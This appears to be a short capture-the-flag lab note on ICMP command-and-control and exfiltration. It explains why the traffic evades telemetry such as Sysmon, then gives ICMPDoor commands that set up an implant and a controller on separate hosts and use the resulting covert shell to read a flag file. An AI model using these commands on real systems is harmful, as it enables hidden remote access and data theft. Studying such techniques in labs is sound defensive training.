# ICMP C2 communication

Data exfiltration can also leverage ICMP flows with a C2 server, using the data payload in ICMP-PING packets.

The detection of data exfiltration using this method is not easy since itâ€™s hard to tell apart "normal", legit 
ICMP traffic from ICMP flows part of an exfiltration attempt. Furthermore, some tools used for endpoint telemetry, 
such as Sysmon, record TCP/UDP connections but not ICMP flows.

Using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool.

On icmp host:

    thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133

On jump host:

    thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121
    [sudo] password for thm:
    shell: hostname
    hostname
    shell: icmp-host

Get the flag:

    shell: getFlag
    getFlag
    shell: [+] Check the flag: /tmp/flag.txt
    
    shell: cat /tmp/flag.txt
    cat /tmp/flag.txt
